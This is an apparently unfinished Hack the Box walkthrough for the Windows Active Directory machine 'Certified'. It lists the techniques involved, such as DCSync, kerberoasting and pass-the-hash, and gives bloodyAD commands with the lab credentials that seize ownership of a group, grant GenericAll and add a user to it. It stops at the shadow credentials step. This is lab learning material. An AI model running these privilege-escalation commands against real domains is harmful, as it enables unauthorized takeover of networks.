# Certified

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan
![image](https://github.com/user-attachments/assets/3d450477-a74d-497b-b96d-dacf1a0f743d)

2. judith.mader has WriteOwner permissions on management group which has GenericWrite privs on management_svc account
![image](https://github.com/user-attachments/assets/9f75d80d-89af-40a5-9972-eb0ff164c551)

3. change owner of management group to judith
	i. `python3 bloodyAD.py --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 set owner "Management" judith.mader`
4. then give GenericAll privs to judith
	i. `python3 bloodyAD.py --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add genericAll Management judith.mader`
5. then add judith to the management group
	i. `python3 bloodyAD.py --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add groupMember Management judith.mader`
6. now can run shadow credential attack on management_svc
  i. 
